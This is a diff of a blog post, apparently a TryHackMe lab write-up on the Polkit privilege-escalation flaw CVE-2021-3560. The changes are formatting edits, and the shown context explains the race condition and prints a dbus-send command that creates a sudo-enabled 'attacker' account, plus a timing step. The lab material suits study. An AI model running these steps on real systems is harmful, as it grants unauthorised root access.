@@ -1,6 +1,6 @@
 ---
 title: 'TryHackMe: Polkit'
-date: 2022-02-13 06:00:00.000000000 Z
+date: 2022-02-13 12:00:00.000000000 Z
 layout: post-external
 original_link: https://cardboard-iguana.com/log/2022-02-13-tryhackme-polkit.html
 author: 100007
@@ -9,8 +9,8 @@ author: 100007
 <h1 id="tryhackme-polkit">TryHackMe: Polkit</h1>
 <p><strong>author:</strong> Nathan Acks<br />
 <strong>date:</strong> 2022-02-13</p>
-<h2 id="polkit-cve-2021-3560">Polkit (CVE-2021-3560)</h2>
-<h3 id="background">Background</h3>
+<h1 id="polkit-cve-2021-3560">Polkit (CVE-2021-3560)</h1>
+<h2 id="background">Background</h2>
 <p>CVE-2021-3560 impacted the following distros (at the time of its announcement):</p>
 <ul>
 <li>Red Hat Enterprise Linux 8</li>
@@ -18,7 +18,7 @@ author: 100007
 <li>Debian Testing (“Bullseye”)</li>
 <li>Ubuntu 20.04 LTS (“Focal Fossa”)</li>
 </ul>
-<p>Ubuntu fixed with with version <code class="language-plaintext highlighter-rouge">0.105-26ubuntu1.1</code> of the <code class="language-plaintext highlighter-rouge">policykit-1</code> package (the last vulnerable version was <code class="language-plaintext highlighter-rouge">0.105-26ubuntu1</code>).</p>
+<p>Ubuntu fixed with with version 0.105-26ubuntu1.1 of the policykit-1 package (the last vulnerable version was 0.105-26ubuntu1).</p>
 <p>This bug is a combination of a race condition and bad error handling. Basically:</p>
 <ul>
 <li>Manually request an action that requires superuser access via DBus.</li>
@@ -28,7 +28,7 @@ author: 100007
 <li>Because the requesting user ID now appears to be root, Polkit just goes ahead and takes the action without issuing a challenge.</li>
 </ul>
 <p>The race condition is obviously kind of tricky, so best to request something that can perhaps provide some persistence, like the creation of a new user account or changing the password on an existing account.</p>
-<h3 id="exploitation-process">Exploitation Process</h3>
+<h2 id="exploitation-process">Exploitation Process</h2>
 <p>(0) Construct a message similar to the following:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dbus-send <span class="se">\</span>
 <span class="nt">--system</span> <span class="se">\</span>
@@ -42,9 +42,9 @@ int32:1
 </code></pre></div></div>
 <p>The three parameters are:</p>
 <ul>
-<li><code class="language-plaintext highlighter-rouge">string:attacker</code> — the name of the user to create.</li>
-<li><code class="language-plaintext highlighter-rouge">string:"Pentester Account"</code> — the user “description” (GECOS field).</li>
-<li><code class="language-plaintext highlighter-rouge">int32:1</code> — grant sudo access to the user.</li>
+<li><code class="language-plaintext highlighter-rouge">string:attacker</code> - the name of the user to create.</li>
+<li><code class="language-plaintext highlighter-rouge">string:"Pentester Account"</code> - the user “description” (GECOS field).</li>
+<li><code class="language-plaintext highlighter-rouge">int32:1</code> - grant sudo access to the user.</li>
 </ul>
 <p>(1) Begin by determining how long the message takes to execute on the target. This can be done with the <code class="language-plaintext highlighter-rouge">time</code> command.</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">time </span>dbus-send <span class="se">\</span>
